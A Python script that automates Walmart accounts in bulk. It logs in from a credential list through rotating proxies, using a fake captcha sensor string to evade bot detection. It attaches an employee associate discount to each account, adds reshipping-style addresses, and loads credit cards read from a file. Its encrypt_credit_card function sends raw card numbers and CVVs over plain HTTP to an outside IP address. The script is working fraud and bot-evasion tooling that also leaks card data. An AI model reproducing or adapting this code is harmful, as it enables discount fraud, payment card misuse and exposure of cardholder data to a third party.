import string
import json as json_module
import aiohttp
import asyncio
import base36
import uuid
import os
import random
import yaml

WALMART_PLATFORM_VERSION = "main-1.67.0-0b3413-0426T1703"

ACCOUNTS_FILE = "accounts.txt"
PROXIES_FILE = "proxies.txt"
CREDIT_CARDS_FILE = "credit-cards.txt"
CONFIG_FILE = "config.yaml"
USER_AGENTS_FILE = "user-agents.txt"


class HttpHeaders:
    OAOH = "oaoh"
    X_O_PLATFORM_NAME = "rweb"
    X_O_CORRELATION_ID = "x-o-correlation-id"
    DEVICE_PROFILE_REF = "device_profile_ref_id"
    X_LATENCY_TRACE = "x-latency-trace"
    WM_MP = "wm_mp"
    TRUE = "true"
    X_O_PLATFORM_VERSION = "x-o-platform-version"
    X_O_SEGMENT = "x-o-segment"
    X_O_GQL_QUERY = "x-o-gql-query"
    WM_PAGE_URL = "wm_page_url"
    X_APOLLO_OPERATION_NAME = "x-apollo-operation-name"
    X_O_PLATFORM = "x-o-platform"
    X_ENABLE_SERVER_TIMING = "x-enable-server-timing"
    X_O_CCM = "x-o-ccm"
    SERVER = "server"
    WM_CORRELATION_ID = "wm_qos.correlation_id"
    X_O_BU = "x-o-bu"
    X_O_MART = "x-o-mart"
    REFERER = "referer"
    CONTENT_TYPE = "content-type"
    ACCEPT_ENCODING = "accept-encoding"
    ACCEPT_LANGUAGE = "accept-language"
    ACCEPT = "accept"
    USER_AGENT = "user-agent"
    SEC_FETCH_SITE = "sec-fetch-site"
    SEC_FETCH_MODE = "sec-fetch-mode"
    SEC_FETCH_DEST = "sec-fetch-dest"
    PRAGMA = "pragma"
    CACHE_CONTROL = "cache-control"


class ContentTypes:
    JSON = "application/json"
    FORM = "application/x-www-form-urlencoded"
    TEXT = "text/plain"
    HTML = "text/html"
    XML = "application/xml"
    BINARY = "application/octet-stream"
    PDF = "application/pdf"
    ZIP = "application/zip"
    GZIP = "application/gzip"
    ALL = "*/*"


class Languages:
    ENGLISH = "en-US,en;q=0.5"


class Encoding:
    GZIP = "gzip, deflate, br"


class CacheControl:
    NO_CACHE = "no-cache"
    MAX_AGE = "max-age=0"
    NO_STORE = "no-store"


class SecFetchHeaders:
    EMPTY = "empty"
    CORS = "cors"
    NAVIGATE = "navigate"
    SAME_ORIGIN = "same-origin"


def get_random_proxy():
    with open(PROXIES_FILE) as f:
        lines = [line.strip() for line in f]
    return random.choice(lines)


def get_random_user_agent():
    with open(USER_AGENTS_FILE) as f:
        lines = [line.strip() for line in f if "Chrome" in line]
    return random.choice(lines)


def generate_random_string(length):
    letters = string.ascii_uppercase
    return "".join(random.choice(letters) for _ in range(length))


async def download_user_agents():
    file_name = USER_AGENTS_FILE
    if os.path.exists(file_name):
        return

    url = "https://ifureadthisur.gay/user-agents.txt"

    async with aiohttp.ClientSession() as session:
        async with session.get(url) as response:
            if response.status == 200:
                with open(file_name, "wb") as f:
                    while True:
                        chunk = await response.content.read(1024)
                        if not chunk:
                            break
                        f.write(chunk)
                print(f"Downloaded user agents to {file_name}")
            else:
                print(f"Failed to download {url}, status code {response.status}")


def load_accounts():
    accounts = []
    try:
        with open(ACCOUNTS_FILE, "r") as f:
            lines = f.readlines()
            for line in lines:
                account = line.strip().split(":")
                accounts.append({"username": account[0], "password": account[1]})
    except IOError as e:
        print(f"Error opening accounts.txt: {e}")

    return accounts


def parse_credit_card(card):
    exp_month = card[2].split("/")[0]
    if exp_month[0] == "0":
        exp_month = exp_month[1]

    exp_year = card[2].split("/")[1]
    if len(exp_year) == 2:
        exp_year = "20" + exp_year

    return {
        "number": card[0],
        "cvv": card[1],
        "expMonth": int(exp_month),
        "expYear": int(exp_year),
        "type": card[3],
    }


def load_credit_cards():
    cc_details = []
    try:
        with open(CREDIT_CARDS_FILE, "r") as f:
            lines = f.readlines()
            for line in lines:
                details = line.strip().split(",")
                cc_details.append(parse_credit_card(details))
    except IOError as e:
        print(f"Error opening credit-cards.txt: {e}")

    return cc_details


def create_default_config(file_path):
    default_config = {
        "seller_id": "YOUR_SELLER_ID",
        "associate_discount_card": "YOUR_DISCOUNT_CARD",
        "associate_discount_wid": "YOUR_DISCOUNT_WID",
        "is_dealbuyer": False,
    }

    with open(file_path, "w") as config_file:
        yaml.dump(default_config, config_file)


def parse_config_file(file_path):
    if not os.path.exists(file_path):
        print("Config file not found, creating default config file.")
        create_default_config(file_path)
        return None

    try:
        with open(file_path, "r") as config_file:
            config_data = yaml.safe_load(config_file)

        seller_id = config_data.get("seller_id")
        associate_discount_card = config_data.get("associate_discount_card")
        associate_discount_wid = config_data.get("associate_discount_wid")
        is_dealbuyer = config_data.get("is_dealbuyer")

        return {
            "seller_id": seller_id,
            "associate_discount_card": associate_discount_card,
            "associate_discount_wid": associate_discount_wid,
            "is_dealbuyer": is_dealbuyer,
        }

    except IOError as e:
        print(f"Error opening file: {e}")
        return None

    except yaml.YAMLError as e:
        print(f"Error parsing YAML: {e}")
        return None


def generate_walmart_login_headers():
    return {
        HttpHeaders.ACCEPT: ContentTypes.ALL,
        HttpHeaders.ACCEPT_LANGUAGE: Languages.ENGLISH,
        HttpHeaders.ACCEPT_ENCODING: Encoding.GZIP,
        HttpHeaders.CONTENT_TYPE: ContentTypes.JSON,
        HttpHeaders.REFERER: "https://www.walmart.com/account/login?vid=oaoh&tid=0&returnUrl=%2F",
    }


def generate_apply_discount_headers():
    co_id = generate_walmart_id(32)
    return {
        HttpHeaders.ACCEPT: ContentTypes.JSON,
        HttpHeaders.ACCEPT_LANGUAGE: Languages.ENGLISH,
        HttpHeaders.ACCEPT_ENCODING: Encoding.GZIP,
        HttpHeaders.CONTENT_TYPE: ContentTypes.JSON,
        HttpHeaders.X_O_CORRELATION_ID: co_id,
        HttpHeaders.WM_CORRELATION_ID: co_id,
        HttpHeaders.WM_MP: "true",
        HttpHeaders.X_O_CCM: "server",
        HttpHeaders.X_O_GQL_QUERY: "mutation LinkAccountAssociateDiscount",
        HttpHeaders.X_APOLLO_OPERATION_NAME: "LinkAccountAssociateDiscount",
        HttpHeaders.WM_PAGE_URL: "https://www.walmart.com/wallet/associate-discount",
    }


def generate_add_shipping_headers():
    co_id = generate_walmart_id(32)
    return {
        HttpHeaders.ACCEPT: ContentTypes.JSON,
        HttpHeaders.ACCEPT_LANGUAGE: Languages.ENGLISH,
        HttpHeaders.ACCEPT_ENCODING: Encoding.GZIP,
        HttpHeaders.CONTENT_TYPE: ContentTypes.JSON,
        HttpHeaders.X_O_CORRELATION_ID: co_id,
        HttpHeaders.WM_CORRELATION_ID: co_id,
        HttpHeaders.X_O_GQL_QUERY: "mutation CreateDeliveryAddress",
        HttpHeaders.X_APOLLO_OPERATION_NAME: "CreateDeliveryAddress",
        HttpHeaders.WM_PAGE_URL: "https://www.walmart.com/account/delivery-addresses",
    }


def generate_add_payment_method_headers():
    co_id = generate_walmart_id(32)
    return {
        HttpHeaders.ACCEPT: ContentTypes.JSON,
        HttpHeaders.ACCEPT_LANGUAGE: Languages.ENGLISH,
        HttpHeaders.ACCEPT_ENCODING: Encoding.GZIP,
        HttpHeaders.CONTENT_TYPE: ContentTypes.JSON,
        HttpHeaders.X_O_CORRELATION_ID: co_id,
        HttpHeaders.WM_CORRELATION_ID: co_id,
        HttpHeaders.X_O_GQL_QUERY: "mutation CreateAccountCreditCard",
        HttpHeaders.X_APOLLO_OPERATION_NAME: "CreateAccountCreditCard",
        HttpHeaders.WM_PAGE_URL: "https://www.walmart.com/wallet",
        HttpHeaders.REFERER: "https://www.walmart.com/wallet",
    }


def generate_shipping_address_form(shipping_info):
    return {
        "variables": {
            "input": {
                "address": {
                    "addressLineOne": shipping_info["address"]["addressLineOne"],
                    "addressLineTwo": shipping_info["address"]["addressLineTwo"],
                    "city": shipping_info["address"]["city"],
                    "postalCode": shipping_info["address"]["postalCode"],
                    "state": shipping_info["address"]["state"],
                    "addressType": None,
                    "businessName": None,
                    "isApoFpo": None,
                    "isLoadingDockAvailable": None,
                    "isPoBox": None,
                    "sealedAddress": None,
                    "latitude": "undefined",
                    "longitude": "undefined",
                },
                "firstName": shipping_info["firstName"],
                "lastName": shipping_info["lastName"],
                "deliveryInstructions": None,
                "deliveryInstructionsList": [],
                "displayLabel": None,
                "isDefault": True,
                "phone": shipping_info["phone"],
                "overrideAvs": True,
            },
            "fetchMXFields": False,
        }
    }


def walmart_login_form(account, device_ua):
    return {
        "username": account["username"],
        "password": account["password"],
        "rememberme": "true",
        "captcha": {
            "sensorData": "2a25G2m84Vrp0o9c4230971.12-1,8,-36,-890,{0},uaend,82457,82672914,en-GB,Gecko,3,7,0,0,500577,5385856,4549,952,9519,603,1302,093,8347,,cpen:6,i9:7,dm:3,cwen:4,non:1,opc:9,fc:2,sc:0,wrc:0,isc:8,vib:1,bat:3,x39:7,x82:2,7541,2.375796728065,234985759788,loc:-9,9,-64,-197,do_en,dm_en,t_en-5,0,-84,-415,6,8,2,2,427,830,6;7,2,1,0,586,879,6;2,-8,0,0,-1,-3,4;9,-0,7,3,-0,-7,2;1,1,7,4,1153,355,7;0,-4,0,7,7593,511,0;1,1,2,5,504,590,1;0,2,4,9,8067,193,6;6,4,1,0,472,516,6;2,-8,0,0,-1,-3,4;9,-0,7,3,-0,-7,2;1,1,7,4,678,492,1;0,7,3,1,7318,690,0;0,-1,6,6,-9,-0,7;4,-0,2,4,-2,-1,0;1,1,2,5,9508,630,0;6,-5,8,8,1026,817,6;2,3,9,8,255,146,2;2,9,7,4,1260,201,7;0,2,1,0,3856,699,7;4,0,6,7,3384,853,1;0,2,4,9,8313,193,6;6,4,1,0,480,846,6;2,3,9,8,4270,014,8;7,2,0,2,0289,3962,0;0,-1,6,6,4292,590,1;0,2,4,8,9923,193,6;6,-9,7,0,2476,146,2;2,1,7,4,2142,201,7;1,-4,0,7,8699,573,0;2,9,2,5,9669,586,0;-3,6,-01,-805,0,8,7,3,699,223,0;7,6,3,2,780,193,6;6,-9,7,0,-4,-0,2;5,-2,9,7,-2,-7,6;2,3,9,8,4390,191,8;7,-8,3,1,7339,638,0;0,3,9,3,115,210,0;2,9,2,5,9239,586,0;6,8,2,2,676,830,6;6,-9,7,0,-4,-0,2;5,-2,9,7,-2,-7,6;2,3,9,8,992,476,2;2,9,7,4,1016,201,7;0,-4,0,6,-5,-2,9;8,-2,9,2,-3,-8,0;0,3,9,3,5610,834,3;0,-3,4,9,8220,131,6;6,4,1,0,648,516,6;3,1,9,8,4407,047,8;7,2,0,2,0830,701,9;8,3,0,7,7995,573,0;2,9,2,5,9585,586,0;6,8,2,2,684,160,6;6,4,1,0,8102,712,4;8,9,0,1,2659,7573,7;0,-4,0,6,8803,210,0;2,9,2,4,0195,586,0;6,-5,8,7,2869,516,6;3,3,9,8,5389,047,8;8,-8,3,1,8435,690,0;1,1,9,3,5771,780,3;-0,4,-12,-005,3,1,7072,undefined,9,2,948;8,2,1134,undefined,7,3,516;8,3,2515,undefined,8,7,590;4,1,3468,undefined,6,6,701;-1,2,-93,-752,1,0,937,1145,92;2,0,953,1144,94;3,0,961,1139,96;4,0,986,1120,99;5,0,007,1190,00;6,0,011,1059,24;7,0,037,1096,521;4,1,382,0675,302;7,8,677,593,315;8,8,693,527,324;00,1,500,070,955;18,4,403,371,221;82,2,396,009,845;16,1,077,826,051;45,0,622,449,120;25,7,026,794,849;15,3,928,310,173;03,7,798,514,450;70,5,350,687,237;35,3,620,310,123;84,9,258,648,097;63,2,481,927,750;40,8,604,715,398;04,0,353,601,777;31,1,698,576,555;98,0,034,238,322,427;66,3,089,428,111,629;52,4,994,314,137,162;88,3,2648,281,697,-1;75,4,8795,472,486,-1;35,6,0607,368,402,-5;-2,1,-97,-079,-3,3,-91,-210,-7,4,-63,-130,-7,8,-75,-184,-1,8,-36,-893,-4,2,-10,-929,-8,5,-80,-533,NaN,54305,2,4,8,7,NaN,3538,7051702548101,7897814268659,39,33894,1,71,5011,6,4,0613,98345,7,gxbcdcqqvof2nukbsjdz_9007,5499,484,186058337,26425874-0,9,-04,-360,-2,9-8,5,-80,-12,-8474643896;6,31,84,86,28,82,60,36,31,66,22,91,19,30,46,43,0;,9;true;true;true;237;true;39;56;true;false;-7-7,4,-63,-83,6897-5,0,-84,-426,94852664-1,2,-93,-750,201583-2,1,-58,-290,;5;2;2".format(
                device_ua
            )
        },
    }


def walmart_associate_discount_form(employee_id, associate_card):
    return {
        "variables": {
            "input": {
                "walmartEmployeeId": employee_id,
                "associateCardNumber": associate_card,
                "ssnFlag": False,
            },
            "fetchMXFields": False,
            "fetchUSFields": True,
        }
    }


def generate_add_payment_method_form(
    expmonth, expyear, encrypted_cc, card_type, billing_info
):
    return {
        "variables": {
            "input": {
                "firstName": billing_info["firstName"],
                "lastName": billing_info["lastName"],
                "expiryMonth": expmonth,
                "expiryYear": expyear,
                "isDefault": True,
                "phone": billing_info["phone"],
                "address": billing_info["address"],
                "cardType": card_type,
                "integrityCheck": encrypted_cc["integrityCheck"],
                "keyId": encrypted_cc["keyId"],
                "phase": encrypted_cc["phase"],
                "encryptedPan": encrypted_cc["encryptedPan"],
                "encryptedCVV": encrypted_cc["encryptedCvv"],
                "sourceFeature": "ACCOUNT_PAGE",
                "cartId": None,
                "checkoutSessionId": None,
            },
            "fetchWalletCreditCardFragment": True,
        },
    }


def generate_walmart_id(length):
    random_list = [random.randint(0, 65535) for i in range(length)]
    result = ""

    for number in random_list:
        remainder = 63 & number
        result += (
            str(base36.dumps(remainder))
            if remainder < 36
            else str(base36.dumps(remainder - 26).upper())
            if remainder < 62
            else "_"
            if remainder < 63
            else "-"
        )

    return result


async def handle_bad_response(response, username):
    if response.status == 403:
        json_body = await response.json()
        if "code" in json_body:
            print("Email code required, skipping {0}".format(username))
        else:
            print("Incorrect username or password. {0}".format(username))
        return False
    elif response.status == 412:
        print("PX Blocked, retrying...")
        return True


async def login_account(account, ua, session, proxy):
    url = "https://www.walmart.com/account/electrode/api/signin?vid=oaoh&tid=0&returnUrl=%2F"

    login_payload = json_module.dumps(walmart_login_form(account, ua))
    headers = generate_walmart_login_headers()

    async with session.post(
        url, data=login_payload, headers=headers, proxy=proxy
    ) as response:
        if response.status == 200:
            print("Logged in successfully with status code:", response.status)
            json_data = await response.json()
            return {
                "firstName": json_data["payload"]["firstName"],
                "lastName": json_data["payload"]["lastName"],
            }
        else:
            result = await handle_bad_response(response, account["username"])


async def encrypt_credit_card(card_number, cvv, session):
    url = "http://165.140.86.17:4444/encrypt"

    headers = {"card-number": card_number, "cvv": cvv}

    async with session.post(url, headers=headers) as response:
        if response.status == 200:
            json_data = await response.json()
            return json_data
        else:
            print("Failed to encrypt card with status code:", response.status)
            return None


async def add_payment_method(card_info, billing_info, session, proxy):
    url = "https://www.walmart.com/orchestra/home/graphql/CreateAccountCreditCard/f7261674df955bafc9a826cc159ddd32123ea72161c422a4678367a95c31b249"

    encrypted_cc = await encrypt_credit_card(
        card_info["number"], card_info["cvv"], session
    )
    payload = generate_add_payment_method_form(
        card_info["expMonth"],
        card_info["expYear"],
        encrypted_cc,
        card_info["type"],
        billing_info,
    )

    headers = generate_add_payment_method_headers()
    async with session.post(
        url, data=json_module.dumps(payload), headers=headers
    ) as response:
        print("Added payment method with status code:", response.status)


async def apply_associate_discount(employee_id, associate_card, session, proxy):
    url = "https://www.walmart.com/orchestra/home/graphql/LinkAccountAssociateDiscount/0c698ff564240ac0780dfcd9a838c1f820cf9b5b873dcd224f38e1d01cca97a0"

    payload = walmart_associate_discount_form(str(employee_id), str(associate_card))
    headers = generate_apply_discount_headers()

    async with session.post(
        url, data=json_module.dumps(payload), headers=headers, proxy=proxy
    ) as response:
        if response.status == 200:
            print("Applied discount successfully.")
            return True
        else:
            print("Error applying discount. Status code:", response.status)
            print(await response.json())
            return False


def format_phone_number(phone_number):
    return "({}) {}-{}".format(phone_number[:3], phone_number[3:6], phone_number[6:])


async def save_shipping_address(shipping_info, session, proxy):
    payload = generate_shipping_address_form(shipping_info)
    headers = generate_add_shipping_headers()
    url = "https://www.walmart.com/orchestra/home/graphql/CreateDeliveryAddress/0427d5d4ffb9b9679473cb3042d7121ce6571fbb23404b024ec840da2c3d394d"

    async with session.post(
        url, data=json_module.dumps(payload), headers=headers, proxy=proxy
    ) as response:
        print("Saved shipping address with status code: ", response.status)

    address_info = {
        "firstName": shipping_info["firstName"],
        "lastName": shipping_info["lastName"],
        "phone": format_phone_number(shipping_info["phone"]),
        "address": {
            "addressLineOne": shipping_info["address"]["addressLineOne"],
            "addressLineTwo": shipping_info["address"]["addressLineTwo"],
            "city": shipping_info["address"]["city"],
            "state": shipping_info["address"]["state"],
            "postalCode": shipping_info["address"]["postalCode"],
            "isPoBox": None,
            "isLoadingDockAvailable": None,
            "isApoFpo": None,
            "businessName": None,
            "addressType": None,
            "sealedAddress": None,
        },
    }

    return address_info


async def setup_account(account, card, config, loop):
    ua = get_random_user_agent()
    headers = {
        HttpHeaders.USER_AGENT: ua,
        HttpHeaders.DEVICE_PROFILE_REF: generate_walmart_id(36),
        HttpHeaders.SEC_FETCH_DEST: SecFetchHeaders.EMPTY,
        HttpHeaders.SEC_FETCH_MODE: SecFetchHeaders.CORS,
        HttpHeaders.SEC_FETCH_MODE: SecFetchHeaders.SAME_ORIGIN,
        HttpHeaders.PRAGMA: CacheControl.NO_CACHE,
        HttpHeaders.CACHE_CONTROL: CacheControl.NO_CACHE,
        HttpHeaders.X_LATENCY_TRACE: "1",
        HttpHeaders.X_ENABLE_SERVER_TIMING: "1",
        HttpHeaders.X_O_PLATFORM: "rweb",
        HttpHeaders.X_O_BU: "WALMART-US",
        HttpHeaders.X_O_MART: "B2C",
        HttpHeaders.WM_MP: "true",
        HttpHeaders.X_O_CCM: "server",
        HttpHeaders.X_O_SEGMENT: "oaoh",
        HttpHeaders.X_O_PLATFORM_VERSION: WALMART_PLATFORM_VERSION,
    }

    cookie_jar = aiohttp.CookieJar(unsafe=True)

    random_proxy = get_random_proxy()
    ip, port, user, password = random_proxy.split(":")

    proxy = f"http://{user}:{password}@{ip}:{port}"

    async with aiohttp.ClientSession(
        loop=loop, headers=headers, cookie_jar=cookie_jar
    ) as session:
        login_data = await login_account(account, ua, session, proxy)

        if not login_data:
            return await setup_account(account, card, config, loop)

        discount_applied = await apply_associate_discount(
            config["associate_discount_wid"],
            config["associate_discount_card"],
            session,
            proxy,
        )

        if not discount_applied:
            print("Failed to apply discount.")
            return

        is_dealbuyer = config["is_dealbuyer"]
        shipping_info = {
            "firstName": login_data["firstName"],
            "lastName": login_data["lastName"],
            "phone": "".join(random.choices("0123456789", k=10)),
            "address": {
                "addressLineOne": "5150 N Basin Ave "
                if is_dealbuyer
                else "473 Old Airport Rd BLDG Four " + generate_random_string(4),
                "addressLineTwo": random.choice(["Apt", "Suite", "Ste", "Unit"])
                + " "
                + str(config["seller_id"]),
                "city": "Portland" if is_dealbuyer else "New Castle",
                "state": "OR" if is_dealbuyer else "DE",
                "postalCode": "97217" if is_dealbuyer else "19720",
            },
        }

        billing_info = await save_shipping_address(shipping_info, session, proxy)

        await add_payment_method(card, billing_info, session, proxy)


async def main(config):
    loop = asyncio.get_running_loop()

    await download_user_agents()

    accounts = load_accounts()
    cards = load_credit_cards()

    tasks = []
    for i in range(len(accounts)):
        account = accounts[i]
        tasks.append(
            asyncio.create_task(setup_account(account, cards[i], config, loop))
        )

    await asyncio.gather(*tasks)


if __name__ == "__main__":
    config = parse_config_file("config.yaml")
    if config is not None:
        asyncio.run(main(config))
